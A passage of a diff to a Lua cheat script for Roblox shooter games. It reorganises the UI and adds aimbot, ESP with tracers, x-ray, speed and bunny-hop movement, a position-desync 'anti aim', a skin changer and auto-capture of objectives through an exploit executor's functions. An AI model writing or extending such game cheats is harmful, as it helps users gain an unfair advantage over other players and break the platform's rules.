+sections.AimbotSection:AddToggle({
     text = "Team",
     state = false,
     risky = false,
@@ -670,45 +629,18 @@ MainSection:AddToggle({
     end
 })
 
-MainSection:AddToggle({
-    text = "ForceField",
+sections.AimbotSection:AddToggle({
+    text = "Force Field",
     state = false,
     risky = false,
-    tooltip = "Enables ForceField Check",
+    tooltip = "Enables Force Field Check",
     flag = "FFCheckAimbot",
     callback = function(v)
         Environment.Settings.ForceField_Check = v
     end
 })
 
-
-MainSection:AddToggle({
-    text = "Closest Point",
-    state = false,
-    risky = false,
-    tooltip = "Enables Closest Point",
-    flag = "ClosestPointEnabled",
-    callback = function(v)
-        Environment.Settings.ClosestBodyPartAimbot = v
-    end
-})
-
-MainSection:AddList({
-    enabled = true,
-    text = "Aim Part", 
-    tooltip = "The part the aimbot locks onto",
-    selected = "Head",
-    multi = false,
-    open = false,
-    max = 6,
-    values = {'Head', 'HumanoidRootPart', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg'},
-    risky = false,
-    callback = function(v)
-        Environment.Settings.LockPart = v
-    end
-})
-
-MainSection:AddSlider({
+sections.AimbotSection:AddSlider({
     enabled = true,
     text = "Smoothness",
     tooltip = "Aimbot smoothness",
@@ -725,9 +657,22 @@ MainSection:AddSlider({
     end
 })
 
-local FOVSection = MainTab:AddSection("FOV", 2)
+sections.AimbotSection:AddList({
+    enabled = true,
+    text = "Aim Part", 
+    tooltip = "The part the aimbot locks onto",
+    selected = "Head",
+    multi = false,
+    open = false,
+    max = 6,
+    values = {'Head', 'HumanoidRootPart', 'Left Arm', 'Right Arm', 'Left Leg', 'Right Leg'},
+    risky = false,
+    callback = function(v)
+        Environment.Settings.LockPart = v
+    end
+})
 
-FOVSection:AddToggle({
+sections.FOVSection:AddToggle({
     text = "Enable",
     state = false,
     risky = false,
@@ -738,7 +683,7 @@ FOVSection:AddToggle({
     end
 })
 
-FOVSection:AddToggle({
+sections.FOVSection:AddToggle({
     text = "Visualise",
     state = false,
     risky = false,
@@ -749,7 +694,46 @@ FOVSection:AddToggle({
     end
 })
 
-FOVSection:AddSlider({
+sections.FOVSection:AddToggle({
+    text = "Filled",
+    state = false,
+    risky = false,
+    tooltip = "Fills the FOV",
+    flag = "FOVEnabled",
+    callback = function(v)
+        Environment.FOVSettings.Filled = v
+    end
+})
+
+sections.FOVSection:AddColor({
+    enabled = true,
+    text = "FOV Color",
+    tooltip = "Change FOV Color",
+    color = Color3.fromRGB(255, 255, 255),
+    flag = "Color_1",
+    trans = 0,
+    open = false,
+    risky = false,
+    callback = function(v)
+        Environment.FOVSettings.Color = v
+    end
+})
+
+sections.FOVSection:AddColor({
+    enabled = true,
+    text = "FOV Locked Color",
+    tooltip = "Change FOV Locked Color",
+    color = Color3.fromRGB(255, 70, 70),
+    flag = "Color_1",
+    trans = 0,
+    open = false,
+    risky = false,
+    callback = function(v)
+        Environment.FOVSettings.LockedColor = v
+    end
+})
+
+sections.FOVSection:AddSlider({
     enabled = true,
     text = "Radius",
     tooltip = "FOV radius",
@@ -766,86 +750,213 @@ FOVSection:AddSlider({
     end
 })
 
-local ESPSection = ESPTab:AddSection("ESP", 1)
+sections.ESPSection:AddToggle({
+    text = "ESP",
+    state = false,
+    tooltip = "Enables ESP",
+    flag = "ESPEnabled",
+    callback = function(v)
+        ESP_SETTINGS.Enabled = v
+    end
+})
 
-ESPSection:AddToggle({
+sections.ESPSection:AddToggle({
     text = "Boxes",
     state = false,
     tooltip = "Enables box ESP",
     flag = "BoxEnabled",
     callback = function(v)
-        BoxEnabled = v
+        ESP_SETTINGS.ShowBox = v
     end
 })
 
-ESPSection:AddToggle({
+sections.ESPSection:AddToggle({
     text = "Health Bar",
     state = false,
     tooltip = "Enables HealthBar ESP",
     flag = "HealthbarEnabled",
     callback = function(v)
-        Healthbars = v
+        ESP_SETTINGS.ShowHealth = v
     end
 })
 
-ESPSection:AddToggle({
+sections.ESPSection:AddToggle({
     text = "Names",
     state = false,
     tooltip = "Enables Name ESP",
     flag = "NameESPEnabled",
     callback = function(v)
-        NameESPEnable = v
+        ESP_SETTINGS.ShowName = v
     end
 })
 
-ESPSection:AddToggle({
+sections.ESPSection:AddToggle({
     text = "Distance",
     state = false,
     tooltip = "Enables distance ESP",
     flag = "DistanceEnabled",
     callback = function(v)
-        DistanceESP_Enabled = v
+        ESP_SETTINGS.ShowDistance = v
     end
 })
 
-ESPSection:AddToggle({
-    text = "Invisible Check",
+sections.ESPSection:AddToggle({
+    text = "Tracers",
     state = false,
-    tooltip = "Stops ESP drawing on invisible players",
-    flag = "ESPInvisibleCheck",
+    tooltip = "Enables Tracers",
+    flag = "TracersEnabled",
     callback = function(v)
-        BoxInvisibleCheck = v
-        HealthBarInvischeck = v
-        DistanceESP_InvisCheck = v
-        NameESPInvisCheck = v
-        NameESPInvisible = v
+        ESP_SETTINGS.ShowTracer = v
     end
 })
 
-ESPSection:AddToggle({
+sections.ESPSection:AddToggle({
     text = "Team Check",
     state = false,
-    tooltip = "Stops ESP drawing onto teammates",
-    flag = "ESPTeamCheck",
+    tooltip = "Stops drawing the ESP on players that are on your team",
+    flag = "TeamCheckEnabled",
     callback = function(v)
-        BoxTeamCheck = v
-        HealthBarTeamCheck = v
-        DistanceESP_TeamCheck = v
-        NameESPTeamCheck = v
+        ESP_SETTINGS.TeamCheck = v
     end
 })
 
-local XRaySection = ESPTab:AddSection("XRay", 3)
+sections.ESPSection:AddToggle({
+    text = "Alive Check",
+    state = false,
+    tooltip = "Stops drawing the ESP on dead players",
+    flag = "AliveCheckEnabled",
+    callback = function(v)
+        ESP_SETTINGS.AliveCheck = v
+    end
+})
+
+sections.ESPSection:AddToggle({
+    text = "Invis Check",
+    state = false,
+    tooltip = "Stops drawing the ESP on invisible players",
+    flag = "InvisCheckEnabled",
+    callback = function(v)
+        ESP_SETTINGS.InvisCheck = v
+    end
+})
+
+sections.ESPSection:AddList({
+    enabled = true,
+    text = "Tracer Position", 
+    tooltip = "Choose the Tracer Position",
+    selected = "Bottom",
+    multi = false,
+    open = false,
+    max = 2,
+    values = {'Top', 'Middle', 'Bottom'},
+    risky = false,
+    callback = function(v)
+        ESP_SETTINGS.TracerPosition = v
+    end
+})
+
+sections.ESPColorSection:AddColor({
+    enabled = true,
+    text = "Box Color",
+    tooltip = "Change the box Color",
+    color = Color3.fromRGB(255, 255, 255),
+    flag = "Color_12",
+    trans = 0,
+    open = false,
+    risky = false,
+    callback = function(v)
+        ESP_SETTINGS.BoxColor = v
+    end
+})
+
+sections.ESPColorSection:AddColor({
+    enabled = true,
+    text = "High Health Color",
+    tooltip = "Change high health color",
+    color = Color3.fromRGB(0, 255, 0),
+    flag = "Color_1234",
+    trans = 0,
+    open = false,
+    risky = false,
+    callback = function(v)
+        ESP_SETTINGS.HealthHighColor = v
+    end
+})
+
+sections.ESPColorSection:AddColor({
+    enabled = true,
+    text = "Low Health Color",
+    tooltip = "Change the low health color",
+    color = Color3.fromRGB(255, 0, 0),
+    flag = "Color_123",
+    trans = 0,
+    open = false,
+    risky = false,
+    callback = function(v)
+        ESP_SETTINGS.HealthLowColor = v
+    end
+})
+
+sections.ESPColorSection:AddColor({
+    enabled = true,
+    text = "Tracer Color",
+    tooltip = "Change the Tracer Color",
+    color = Color3.fromRGB(255, 255, 255),
+    flag = "Color_12345",
+    trans = 0,
+    open = false,
+    risky = false,
+    callback = function(v)
+       ESP_SETTINGS.TracerColor = v
+    end
+})
+
+sections.ESPColorSection:AddColor({
+    enabled = true,
+    text = "Name Color",
+    tooltip = "Change the Name Color",
+    color = Color3.fromRGB(255, 255, 255),
+    flag = "Color_123456",
+    trans = 0,
+    open = false,
+    risky = false,
+    callback = function(v)
+        ESP_SETTINGS.NameColor = v
+    end
+})
+
+sections.ESPColorSection:AddColor({
+    enabled = true,
+    text = "Distance Color",
+    tooltip = "Change the Distance Color",
+    color = Color3.fromRGB(255, 255, 255),
+    flag = "Color_1234567",
+    trans = 0,
+    open = false,
+    risky = false,
+    callback = function(v)
+        ESP_SETTINGS.DistanceColor = v
+    end
+})
+
+local function isDescendantOfAnyPlayerCharacter(part)
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if part:IsDescendantOf(player.Character) then
+            return true
+        end
+    end
+    return false
+end
 
 local function xray(xrayEnabled)
     for _, v in pairs(workspace:GetDescendants()) do
-        if v:IsA("BasePart") and not v:IsDescendantOf(game.Players.LocalPlayer.Character) then
+        if v:IsA("BasePart") and not v:IsDescendantOf(game.Players.LocalPlayer.Character) and not isDescendantOfAnyPlayerCharacter(v) then
             v.LocalTransparencyModifier = xrayEnabled and 0.5 or 0
         end
     end
-end   
+end
 
-XRaySection:AddToggle({
+sections.XRaySection:AddToggle({
     text = "XRay",
     state = false,
     risky = false,
@@ -856,12 +967,86 @@ XRaySection:AddToggle({
     end
 })
 
-local MovementSection = PlayerTab:AddSection("Movement", 1)
 
-local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+
+if game.PlaceId == 4888256398 or game.PlaceId == 17227761001 or game.PlaceId == 15247475957 then
+    local weapon = game.Players.LocalPlayer
+
+    local selectedSkin = "Default"
+    local skins = {
+        "Default", "Wyvern", "Tsunami", "Magma", "Ion", "Toxic", "Staff", "Boundless",
+        "Scythe", "Catalyst", "Offwhite", "Pulsar", "Blueberry", "Rusted", "Frigid",
+        "Anniversary", "HellSpawn", "Booster", "Rose", "Dove", "Plasma", "Molten",
+        "Imperial", "Gobbler", "Blackice", "Jolly", "Fuchsia", "Manny", "Frost",
+        "Lumberjack", "Mythical", "Sinister", "Gold", "Phantom", "F2", "D2", "C2", "B2", "A2",
+        "N2", "S2", "X2"
+    }
+
+    local function changeSkin(skin)
+        if selectedSkin ~= skin then
+            selectedSkin = skin
+            weapon:SetAttribute("EquippedSkin", skin)
+        end
+    end
+
+    sections.TGSection:AddList({
+        enabled = true,
+        text = "Skin Changer",
+        tooltip = "Changes the skin of your gun",
+        selected = selectedSkin,
+        multi = false,
+        open = false,
+        max = 5,
+        values = skins,
+        callback = changeSkin
+    })
+
+    sections.TGSection:AddSeparator({
+        enabled = true,
+        text = "Points"
+    })
+
+    getgenv().AutoCapPoint = false
+
+    local function AutoCapPoint1()
+        if getgenv().AutoCapPoint then
+            local objectives = game.Workspace.Objectives:GetChildren()
+            for _, objective in ipairs(objectives) do
+                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, objective.Trigger, 0)
+            end
+        end
+    end
+
+    RunService.RenderStepped:Connect(AutoCapPoint1)
+
+    sections.TGSection:AddToggle({
+        enabled = true,
+        text = "Auto Capture",
+        state = false,
+        risky = false,
+        tooltip = "Automatically capture points",
+        flag = "AutoCapPoint",
+        risky = false,
+        callback = function(v)
+            AutoCapPoint = v
+        end
+    })
+
+    sections.TGSection:AddButton({
+        enabled = true,
+        text = "Capture",
+        tooltip = "Capture the Point",
+        confirm = false,
+        risky = false,
+        callback = function()
+            local objectives = game.Workspace.Objectives:GetChildren()
+            for _, objective in ipairs(objectives) do
+                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, objective.Trigger, 0)
+            end
+        end
+    })
+
+end
 
 getgenv().cframe12 = true
 getgenv().cfrene12 = false
@@ -891,12 +1076,12 @@ UserInputService.InputBegan:Connect(onKeyPress)
 
 coroutine.wrap(moveCharacter)()
 
-MovementSection:AddToggle({
+sections.MovementSection:AddToggle({
     text = "CFrame Walk",
     state = false,
     risky = false,
     tooltip = "Enable CFrame Walk",
-    flag = "Toggle_131",
+    flag = "CFrameToggle",
     risky = false,
     callback = function(v)
         getgenv().cfrene12 = v
@@ -907,7 +1092,7 @@ MovementSection:AddToggle({
     tooltip = "Change keybind",
     mode = "toggle",
     bind = "None",
-    flag = "ToggleKey_123123",
+    flag = "CFrameBind",
     state = false,
     nomouse = false,
     risky = false,
@@ -919,11 +1104,11 @@ MovementSection:AddToggle({
     end
 })
 
-MovementSection:AddSlider({
+sections.MovementSection:AddSlider({
     enabled = true,
     text = "Speed",
     tooltip = "Change speed",
-    flag = "Slider_13131",
+    flag = "CFrameSpeedSlider",
     suffix = "",
     dragging = true,
     focused = false,
@@ -936,9 +1121,273 @@ MovementSection:AddSlider({
     end
 })
 
-MovementSection:AddSeparator({
+local camera1 = game.Players.LocalPlayer
+local cameraMode = ""
+
+local function changeCameraMode(mode)
+    if cameraMode == "Classic" then
+        camera1.DevComputerCameraMode = Enum.DevComputerCameraMovementMode.Classic
+    elseif cameraMode == "CameraToggle" then
+        camera1.DevComputerCameraMode = Enum.DevComputerCameraMovementMode.CameraToggle
+    elseif cameraMode == "UserChoice" then
+    camera1.DevComputerCameraMode = Enum.DevComputerCameraMovementMode.UserChoice
+    end
+end
+
+sections.ThirdPersonSection:AddList({
     enabled = true,
-    text = "Bunny Hop"
+    text = "Select Camera Mode", 
+    tooltip = "CameraToggle is recommended for third person",
+    selected = "Classic",
+    multi = false,
+    open = false,
+    max = 4,
+    values = {"Classic", "CameraToggle", "UserChoice"},
+    risky = false,
+    callback = function(v)
+        cameraMode = v
+        changeCameraMode(cameraMode)
+    end
+})
+
+local enabled5 = false
+
+local function ThirdPersonFunction()
+    while enabled5 do
+        game.Players.LocalPlayer.CameraMode = Enum.CameraMode.Classic 
+        game.Players.LocalPlayer.CameraMaxZoomDistance = 1000
+        game.Players.LocalPlayer.CameraMinZoomDistance = 0
+        wait(0.5) 
+    end
+end
+
+sections.ThirdPersonSection:AddToggle({
+    text = "Third Person",
+    state = false,
+    risky = false,
+    tooltip = "Enable Third Person",
+    flag = "Toggle_1",
+    callback = function(v)
+        enabled5 = v
+        if enabled5 then
+            ThirdPersonFunction()
+        end
+    end
+})
+
+local cframetpdesync = false
+local cframetpdesynctype = ""
+
+local customcframetpx = 0
+local customcframetpy = 0
+local customcframetpz = 0
+
+local desync_stuff = {}
+
+game:GetService("RunService").heartbeat:Connect(
+    function()
+        if cframetpdesync == true then
+            desync_stuff[1] = lplr.Character.HumanoidRootPart.CFrame
+            local fakeCFrame = lplr.Character.HumanoidRootPart.CFrame
+            if cframetpdesynctype == "Nothing" then
+                fakeCFrame = fakeCFrame * CFrame.new()
+            elseif cframetpdesynctype == "Custom" then
+                fakeCFrame = fakeCFrame * CFrame.new(customcframetpx, customcframetpy, customcframetpz)
+            elseif cframetpdesynctype == "Random" then
+                local randomOffsetX = math.random(-50, 50)
+                local randomOffsetY = math.random(-50, 50)
+                local randomOffsetZ = math.random(-50, 50)
+                fakeCFrame = fakeCFrame * CFrame.new(randomOffsetX, randomOffsetY, randomOffsetZ)
+            end
+            lplr.Character.HumanoidRootPart.CFrame = fakeCFrame
+            game:GetService("RunService").RenderStepped:Wait()
+            lplr.Character.HumanoidRootPart.CFrame = desync_stuff[1]
+        else
+        end
+    end
+)
+
+
+sections.AntiAimSection:AddToggle({
+    enabled = true,
+    text = "Anti Aim",
+    state = false,
+    risky = false,
+    tooltip = "Enable Anti Aim",
+    flag = "AntiAimToggle1",
+    risky = false,
+    callback = function(v)
+        cframetpdesync = v
+    end
+})
+
+sections.AntiAimSection:AddList({
+    enabled = true,
+    text = "Anti Aim Type", 
+    tooltip = "Select Anti Aim Type",
+    selected = "Nothing", 
+    multi = false,
+    open = false,
+    max = 4,
+    values = {"Nothing", "Custom", "Random"},
+    risky = false,
+    callback = function(v)
+        cframetpdesynctype = v
+    end
+})
+
+sections.AntiAimSection:AddSlider({
+    enabled = true,
+    text = "X",
+    tooltip = "Change the X offset",
+    flag = "Slider_11",
+    suffix = "",
+    dragging = true,
+    focused = false,
+    min = -50,
+    max = 50,
+    increment = 1,
+    risky = false,
+    callback = function(v)
+        customcframetpx = v
+    end
+})
+
+sections.AntiAimSection:AddSlider({
+    enabled = true,
+    text = "Y",
+    tooltip = "Change the Y offset",
+    flag = "Slider_13",
+    suffix = "",
+    dragging = true,
+    focused = false,
+    min = -50,
+    max = 50,
+    increment = 1,
+    risky = false,
+    callback = function(v)
+        customcframetpy = v 
+    end
+})
+
+sections.AntiAimSection:AddSlider({
+    enabled = true,
+    text = "Z",
+    tooltip = "Change the Z offset",
+    flag = "Slider_15",
+    suffix = "",
+    dragging = true,
+    focused = false,
+    min = -50,
+    max = 50,
+    increment = 1,
+    risky = false,
+    callback = function(v)
+        customcframetpz = v 
+    end
+})
+
+local cameraToggle = false
+
+local offsetX = 0 
+local offsetY = 5
+local offsetZ = 0 
+
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local camera = game.Workspace.CurrentCamera
+
+local cameraPart = Instance.new("Part")
+cameraPart.Name = "CameraPosition"
+cameraPart.Size = Vector3.new(math.huge, math.huge, math.huge)
+cameraPart.Transparency = 1
+cameraPart.Anchored = true
+cameraPart.CanCollide = false
+cameraPart.Parent = game.Workspace
+
+local function updateCamera()
+    if cameraToggle then
+        local rootPart = character:FindFirstChild("Head")
+        if rootPart then
+            cameraPart.Position = rootPart.Position + Vector3.new(offsetX, offsetY, offsetZ)
+            camera.CameraSubject = cameraPart
+        end
+    else
+        camera.CameraSubject = character:FindFirstChild("Humanoid") or character:FindFirstChild("Head")
+    end
+end
+
+local function onCharacterAdded(newCharacter)
+    character = newCharacter
+    updateCamera()
+end
+
+player.CharacterAdded:Connect(onCharacterAdded)
+
+game:GetService("RunService").RenderStepped:Connect(updateCamera)
+
+sections.CameraOffsetSection:AddToggle({
+    text = "Camera Offset",
+    state = false,
+    risky = true,
+    tooltip = "Enable Camera Offset",
+    flag = "Toggle_1",
+    risky = false,
+    callback = function(v)
+        cameraToggle = v
+        updateCamera() 
+    end
+})
+
+sections.CameraOffsetSection:AddSlider({
+    enabled = true,
+    text = "X",
+    tooltip = "Change the X offset",
+    flag = "Slider_11",
+    suffix = "",
+    dragging = true,
+    focused = false,
+    min = -50,
+    max = 50,
+    increment = 1,
+    risky = false,
+    callback = function(v)
+        offsetX = v
+    end
+})
+
+sections.CameraOffsetSection:AddSlider({
+    enabled = true,
+    text = "Y",
+    tooltip = "Change the Y offset",
+    flag = "Slider_13",
+    suffix = "",
+    dragging = true,
+    focused = false,
+    min = -50,
+    max = 50,
+    increment = 1,
+    risky = false,
+    callback = function(v)
+        offsetY = v
+    end
+})
+
+sections.CameraOffsetSection:AddSlider({
+    enabled = true,
+    text = "Z",
+    tooltip = "Change the Z offset",
+    flag = "Slider_157",
+    suffix = "",
+    dragging = true,
+    focused = false,
+    min = -50,
+    max = 50,
+    increment = 1,
+    risky = false,
+    callback = function(v)
+        offsetZ = v
+    end
 })
 
 getgenv().bhopEnabled = false
@@ -962,7 +1411,7 @@ local function changeBhopKey(newKey)
     getgenv().bhopKey = newKey
 end
 
-MovementSection:AddToggle({
+sections.MovementSection:AddToggle({
     enabled = true,
     text = "Bunny Hop",
     state = false,
@@ -971,537 +1420,17 @@ MovementSection:AddToggle({
     flag = "BHOP_toggle1",
     callback = function(v)
         getgenv().bhopEnabled = v
-    end
-})
-
---// Lighting Section
-
-local LightingSection = MiscTab:AddSection("Lighting", 1)
-
-local function changeBrightness(value)
-    game:GetService("Lighting").Brightness = value
-end
-
-LightingSection:AddSlider({
-    enabled = true,
-    text = "Brightness",
-    tooltip = "Adjust the brightness of the game",
-    flag = "Brightness_Slider",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = 1,
-    max = 10,
-    increment = 0.1,
-    risky = false,
-    callback = function(v)
-        changeBrightness(v)
-    end
-})
-
---// Third Person 
-
-local ThirdPersonSection = PlayerTab:AddSection("Third Person", 2)
-
-local enabled5 = false
-
-local function ThirdPersonFunction()
-    while enabled5 do
-        game.Players.LocalPlayer.CameraMode = Enum.CameraMode.Classic 
-        game.Players.LocalPlayer.CameraMaxZoomDistance = 1000
-        game.Players.LocalPlayer.CameraMinZoomDistance = 0
-        wait(0.5) 
-    end
-end
-
-ThirdPersonSection:AddToggle({
-    text = "Third Person",
-    state = false,
-    risky = false,
-    tooltip = "Enable Third Person",
-    flag = "Toggle_1",
-    callback = function(v)
-        enabled5 = v
-        if enabled5 then
-            ThirdPersonFunction()
-        end
-    end
-})
-
-local camera1 = game.Players.LocalPlayer
-local cameraMode = ""
-
-local function changeCameraMode(mode)
-    if cameraMode == "Classic" then
-        camera1.DevComputerCameraMode = Enum.DevComputerCameraMovementMode.Classic
-    elseif cameraMode == "CameraToggle (Recommended for TP)" then
-        camera1.DevComputerCameraMode = Enum.DevComputerCameraMovementMode.CameraToggle
-    elseif cameraMode == "UserChoice" then
-    camera1.DevComputerCameraMode = Enum.DevComputerCameraMovementMode.UserChoice
-    end
-end
-
-ThirdPersonSection:AddList({
-    enabled = true,
-    text = "Select Camera Mode", 
-    tooltip = "CameraToggle is recommended for third person",
-    selected = "Classic",
-    multi = false,
-    open = false,
-    max = 4,
-    values = {"Classic", "CameraToggle (Recommended for TP)", "UserChoice"},
-    risky = false,
-    callback = function(v)
-        cameraMode = v
-        changeCameraMode(cameraMode)
-    end
-})
-
-local enabled1 = false
-
-local transparencyvalue = 0
-
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local hrp1 = character.HumanoidRootPart
-
-local function transparentCharFunction()
-    while enabled1 do
-        wait(0.05)
-        for _, part in pairs(character:GetDescendants()) do
-            if part:IsA("BasePart") or part:IsA("Decal") then
-                part.Transparency = transparencyvalue
-                hrp1.Transparency = 1
-            elseif part:IsA("ParticleEmitter") or part:IsA("Trail") then
-                part.Enabled = false
-            elseif part:IsA("Model") then
-                part.Transparency = 0
-            end
-        end
-    end    
-end
-
-player.CharacterAdded:Connect(function(newCharacter)
-    character = newCharacter
-    transparentCharFunction()
-end)
-
-ThirdPersonSection:AddToggle({
-    text = "Make Character Transparent",
-    state = false,
-    risky = true,
-    tooltip = "Make your character transparent",
-    flag = "Toggle_15675",
-    risky = false,
-    callback = function(v)
-        enabled1 = v
-        if enabled1 then
-            transparentCharFunction()
-        end    
-    end
-})
-
-ThirdPersonSection:AddSlider({
-    enabled = true,
-    text = "Transparency",
-    tooltip = "Change Transparency",
-    flag = "Slider_1124241",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = 0,
-    max = 1,
-    increment = 0.01,
-    risky = false,
-    callback = function(v)
-        transparencyvalue = v
-    end
-})
-
---// Anti Aim
-
-local AntiAimSection = PlayerTab:AddSection("Anti Aim", 3)
-
-local cframetpdesync = false
-local cframetpdesynctype = ""
-
-local customcframetpx = 0
-local customcframetpy = 0
-local customcframetpz = 0
-
-local desync_stuff = {}
-
-game:GetService("RunService").heartbeat:Connect(
-    function()
-        if cframetpdesync == true then
-            desync_stuff[1] = lplr.Character.HumanoidRootPart.CFrame
-            local fakeCFrame = lplr.Character.HumanoidRootPart.CFrame
-            if cframetpdesynctype == "Nothing" then
-                fakeCFrame = fakeCFrame * CFrame.new()
-            elseif cframetpdesynctype == "Custom" then
-                fakeCFrame = fakeCFrame * CFrame.new(customcframetpx, customcframetpy, customcframetpz)
-            end
-            lplr.Character.HumanoidRootPart.CFrame = fakeCFrame
-            game:GetService("RunService").RenderStepped:Wait()
-            lplr.Character.HumanoidRootPart.CFrame = desync_stuff[1]
+        if bhopEnabled then
+            game.Players.LocalPlayer.Character.Head.CanCollide = false
+            game.Players.LocalPlayer.Character.Torso.CanCollide = false
         else
-        end
-    end
-)
-
-AntiAimSection:AddToggle({
-    enabled = true,
-    text = "Anti Aim",
-    state = false,
-    risky = true,
-    tooltip = "Enable Anti Aim",
-    flag = "AntiAimToggle1",
-    risky = false,
-    callback = function(v)
-        cframetpdesync = v
-    end
-})
-
-AntiAimSection:AddList({
-    enabled = true,
-    text = "Anti Aim Type", 
-    tooltip = "Select Anti Aim Type",
-    selected = "Nothing", 
-    multi = false,
-    open = false,
-    max = 4,
-    values = {"Nothing", "Custom"},
-    risky = false,
-    callback = function(v)
-        cframetpdesynctype = v
-    end
-})
-
-AntiAimSection:AddSlider({
-    enabled = true,
-    text = "X",
-    tooltip = "Change the X offset",
-    flag = "Slider_11",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = -50,
-    max = 50,
-    increment = 1,
-    risky = false,
-    callback = function(v)
-        customcframetpx = v
-    end
-})
-
-AntiAimSection:AddSlider({
-    enabled = true,
-    text = "Y",
-    tooltip = "Change the Y offset",
-    flag = "Slider_13",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = -50,
-    max = 50,
-    increment = 1,
-    risky = false,
-    callback = function(v)
-        customcframetpy = v 
-    end
-})
-
-AntiAimSection:AddSlider({
-    enabled = true,
-    text = "Z",
-    tooltip = "Change the Z offset",
-    flag = "Slider_15",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = -50,
-    max = 50,
-    increment = 1,
-    risky = false,
-    callback = function(v)
-        customcframetpz = v 
-    end
-})
-
---// Camera Offsets
-
-AntiAimSection:AddSeparator({
-    enabled = true,
-    text = "Camera Offset"
-})
-
-local cameraToggle = false
-
-local offsetX = 0 
-local offsetY = 0 
-local offsetZ = 0 
-
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local camera = game.Workspace.CurrentCamera
-
-local cameraPart = Instance.new("Part")
-cameraPart.Name = "CameraPosition"
-cameraPart.Size = Vector3.new(4, 4, 4)
-cameraPart.Transparency = 1
-cameraPart.Anchored = true
-cameraPart.CanCollide = false
-cameraPart.Parent = game.Workspace
-
-local function updateCamera()
-    if cameraToggle then
-        local rootPart = character:FindFirstChild("HumanoidRootPart")
-        if rootPart then
-            cameraPart.Position = rootPart.Position + Vector3.new(offsetX, offsetY, offsetZ)
-            camera.CameraSubject = cameraPart
-        end
-    else
-        camera.CameraSubject = character:FindFirstChild("Humanoid") or character:FindFirstChild("Head")
-    end
-end
-
-local function onCharacterAdded(newCharacter)
-    character = newCharacter
-    updateCamera()
-end
-
-player.CharacterAdded:Connect(onCharacterAdded)
-
-game:GetService("RunService").RenderStepped:Connect(updateCamera)
-
-AntiAimSection:AddToggle({
-    text = "Camera Offset",
-    state = false,
-    risky = true,
-    tooltip = "Enable Camera Offset",
-    flag = "Toggle_1",
-    risky = false,
-    callback = function(v)
-        cameraToggle = v
-        updateCamera() 
-    end
-})
-
-AntiAimSection:AddSlider({
-    enabled = true,
-    text = "X",
-    tooltip = "Change the X offset",
-    flag = "Slider_11",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = -50,
-    max = 50,
-    increment = 1,
-    risky = false,
-    callback = function(v)
-        offsetX = v
-    end
-})
-
-AntiAimSection:AddSlider({
-    enabled = true,
-    text = "Y",
-    tooltip = "Change the Y offset",
-    flag = "Slider_13",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = -50,
-    max = 50,
-    increment = 1,
-    risky = false,
-    callback = function(v)
-        offsetY = v
-    end
-})
-
-AntiAimSection:AddSlider({
-    enabled = true,
-    text = "Z",
-    tooltip = "Change the Z offset",
-    flag = "Slider_157",
-    suffix = "",
-    dragging = true,
-    focused = false,
-    min = -50,
-    max = 50,
-    increment = 1,
-    risky = false,
-    callback = function(v)
-        offsetZ = v
-    end
-})
-
-local tg = 4888256398 
-
-local function isTargetGame()
-    return game.PlaceId == tg
-end
-
-if isTargetGame() then
-    local SkinTabSection = MiscTab:AddSection("SkinTab", 2)
-    local weapon = game.Players.LocalPlayer
-
-    local selectedSkin = "N/A"
-    local function changeSkin(skin)
-        if selectedSkin == skin then
-            return
-        end
-        
-        selectedSkin = skin
-        
-        local skins = {
-            Default = "Default",
-            Wyvern = "Wyvern",
-            Tsunami = "Tsunami",
-            Magma = "Magma",
-            Ion = "Ion",
-            Toxic = "Toxic",
-            Staff = "Staff",
-            Boundless = "Boundless",
-            Scythe = "Scythe",
-            Catalyst = "Catalyst",
-            Offwhite = "Offwhite",
-            Pulsar = "Pulsar",
-            Blueberry = "Blueberry",
-            Rusted = "Rusted",
-            Frigid = "Frigid",
-            Anniversary = "Anniversary",
-            HellSpawn = "HellSpawn",
-            Booster = "Booster",
-            Rose = "Rose",
-            Dove = "Dove",
-            Plasma = "Plasma",
-            Molten = "Molten",
-            Imperial = "Imperial",
-            Gobbler = "Gobbler",
-            Blackice = "Blackice",
-            Jolly = "Jolly",
-            Fuchsia = "Fuchsia",
-            Manny = "Manny",
-            Frost = "Forst",
-            Lumberjack = "Lumberjack",
-            Mythical = "Mythical",
-            Sinister = "Sinister",
-            Gold = "Gold",
-            F2 = "F2",
-            D2 = "D2",
-            C2 = "C2",
-            B2 = "B2",
-            A2 = "A2",
-            N2 = "N2",
-            S2 = "S2",
-            X2 = "X2"
-        }
-        
-        local selected = skins[skin]
-        if selected then
-            weapon:SetAttribute("EquippedSkin", selected)
-        end
-    end
-
-    SkinTabSection:AddList({
-        enabled = true,
-        text = "Skin Changer",
-        tooltip = "Changes the skin of your gun",
-        selected = selectedSkin,
-        multi = false,
-        open = false,
-        max = 10,
-        values = {
-            "Default", "Wyvern", "Tsunami", "Magma", "Ion", "Toxic", "Staff", "Boundless", "Scythe",
-            "Catalyst", "Offwhite", "Pulsar", "Blueberry", "Rusted", "Frigid", "Anniversary", "Lumberjack",
-            "HellSpawn", "Booster", "Rose", "Dove", "Plasma", "Molten", "Imperial", "Gobbler", "Blackice", 
-            "Jolly", "Fuchsia", "Manny", "Mythical", "Sinister", "Gold", "F2", "D2", "C2", "B2", "A2", "N2", "S2", "X2"
-        },
-        callback = function(v)
-            changeSkin(v)
-        end
-    })
-end
-
-local SpinBotSection = PlayerTab:AddSection("Spinbot", 1)
-
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
-local SpinBotspeed = 0
-local spinActive = false
-local velocity
-local humRoot
-
-local function initialize()
-    repeat task.wait() until plr.Character
-    humRoot = plr.Character:WaitForChild("HumanoidRootPart")
